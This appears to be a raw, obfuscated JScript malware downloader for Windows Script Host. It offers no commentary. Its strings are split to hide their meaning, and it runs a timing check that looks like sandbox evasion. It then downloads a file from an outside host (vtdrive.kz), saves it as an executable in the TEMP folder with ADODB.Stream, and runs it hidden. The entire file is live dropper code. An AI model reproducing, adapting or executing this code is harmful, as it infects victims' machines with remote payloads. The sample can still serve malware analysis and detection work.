var BK = false;
var JS = "Create"+"Object";
var QM = function KI() {return WScript[JS]("WScript"+".Shell");}(), T = 11;
var R = "MSXML2"+".XMLHTTP";
var I = 2;
var NS = I - 2;
function O(ME){QM["Run"](ME, NS, NS);};
function YT(){return R + "";};
function LU(LA, JF){NS = NS * 1; return LA - JF;};
function VE(){return JS;};
/*@cc_on
  @if (@_win32 || @_win64)
    BK = true;
  @end
@*/
if (BK)
{
var V = "";
function A(){return 22;};
var Z = 0; var WA = 0;
function HL()
{
var PR = new this["Date"]();
var G = PR["getUTCMilliseconds"]();
WScript["Sleep"](A());
var PR = new this["Date"]();
var Q0 = PR["getUTCMilliseconds"]();
WScript["Sleep"](A());
var PR = new this["Date"]();
var MX = PR["getUTCMilliseconds"]();
var Z = "CL";
Z = LU(Q0, G);
var WA = "PG";
WA = LU(MX, Q0);
V = "open";
return LU(Z, WA);
}
var K = false;
var C = false;
for (var FM = NS; FM < A() * 1; FM++){if (HL() != NS){
K = true; 
WA = "31" + 11 * Z + WA; 
C = true; 
break;
}}
function S() {return ((K == true) && (K == C)) ? 1 : NS;};
if (K && S() && C){
function GC() {return QM["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "g65yUveOurle4PF.ex" + "e";};
 RM = YT();
 UW = WScript[JS](RM);
 var Q = 1;
do { 
	for (;Q;){
	try {
		if (Q == 1)
		{
			UW[V]("GET", "http://vtdrive.kz/f6dh1a", false);
			UW["send"]();
			TQ = "Sleep";
			Q = 2;
		}
		WScript[TQ](A() + 120); 
		if (UW["readystate"] < 2 * 2) continue;
		Q = NS;
		function BI(Y) {var ZT = (1, 2, 3, 4, 5, Y); return ZT;};
		WJ = WScript[VE()]("ADODB.Stream");
		RM = WJ;
		RM[V]();
		RM["type"] = BI(1);
		RM["write"](UW["ResponseBody"]);
		WJ["position"] = BI(NS);
		RM["Save" + "ToFile"](GC(), 2);
		WJ["cl"+"ose"]();
		W = GC();
		O(W);
	} catch(F){};};
}while (Q);
}
}

